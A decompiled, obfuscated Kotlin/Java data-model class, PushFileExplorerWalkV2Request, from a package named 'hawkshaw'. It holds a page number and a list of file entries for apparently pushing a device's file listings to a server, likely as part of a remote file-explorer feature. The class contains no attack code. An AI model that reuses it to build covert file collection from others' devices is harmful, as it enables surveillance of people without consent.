package com.hawkshaw.library.datalayer.models;

import B3.f;
import D3.b;
import E3.C0020d;
import E3.q0;
import Y1.K;
import java.util.List;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import p3.q;
import w3.w;

@f
public final class PushFileExplorerWalkV2Request {
    /* access modifiers changed from: private */
    public static final KSerializer[] $childSerializers = {null, new C0020d(AppFileV2$$serializer.INSTANCE, 0)};
    public static final Companion Companion = new Companion((j3.f) null);
    private final int currentPage;
    private final List<AppFileV2> files;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return PushFileExplorerWalkV2Request$$serializer.INSTANCE;
        }
    }

    public /* synthetic */ PushFileExplorerWalkV2Request(int i5, int i6, List list, q0 q0Var) {
        if (3 == (i5 & 3)) {
            this.currentPage = i6;
            this.files = list;
            return;
        }
        w.x(i5, 3, PushFileExplorerWalkV2Request$$serializer.INSTANCE.getDescriptor());
        throw null;
    }

    public static /* synthetic */ void getCurrentPage$annotations() {
    }

    public static /* synthetic */ void getFiles$annotations() {
    }

    public static final /* synthetic */ void write$Self$library_release(PushFileExplorerWalkV2Request pushFileExplorerWalkV2Request, b bVar, SerialDescriptor serialDescriptor) {
        KSerializer[] kSerializerArr = $childSerializers;
        q qVar = (q) bVar;
        qVar.c0(0, pushFileExplorerWalkV2Request.currentPage, serialDescriptor);
        qVar.e0(serialDescriptor, 1, kSerializerArr[1], pushFileExplorerWalkV2Request.files);
    }

    public final int getCurrentPage() {
        return this.currentPage;
    }

    public final List<AppFileV2> getFiles() {
        return this.files;
    }

    public PushFileExplorerWalkV2Request(int i5, List<AppFileV2> list) {
        K.n(list, "files");
        this.currentPage = i5;
        this.files = list;
    }
}
